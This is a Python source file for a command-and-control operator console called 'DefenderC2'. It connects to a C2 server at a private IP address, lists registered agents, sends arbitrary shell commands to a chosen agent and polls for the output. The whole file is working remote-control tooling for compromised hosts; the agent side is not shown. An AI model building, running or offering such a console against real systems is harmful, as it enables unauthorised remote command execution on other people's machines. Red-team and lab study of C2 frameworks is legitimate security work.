import cmd
import requests
import time

C2_SERVER = "http://192.168.88.128:5000"

class C2Console(cmd.Cmd):
    prompt = "DefenderC2> "

    def do_list_agents(self, arg):
        """List all registered agents"""
        try:
            response = requests.get(f"{C2_SERVER}/list_agents")
            print(response.json())
        except Exception as e:
            print("[-] Error listing agents:", e)

    def do_send_command(self, arg):
        """Send a command to an agent"""
        try:
            agent_id, command = arg.split(" ", 1)
            response = requests.post(f"{C2_SERVER}/command", json={"id": agent_id, "command": command})
            print(response.json().get("message"))

            # Poll for output up to 10 seconds
            for _ in range(5):
                time.sleep(2)
                result = requests.get(f"{C2_SERVER}/result/{agent_id}")
                output = result.json().get("output")
                if output:
                    print(">> Output:\n", output)
                    break
            else:
                print(">> Output:\n No output received yet.")

        except ValueError:
            print("Usage: send_command <agent_id> <command>")
        except Exception as e:
            print("[-] Error sending command:", e)

    def do_exit(self, arg):
        """Exit the framework"""
        return True

if __name__ == "__main__":
    C2Console().cmdloop()

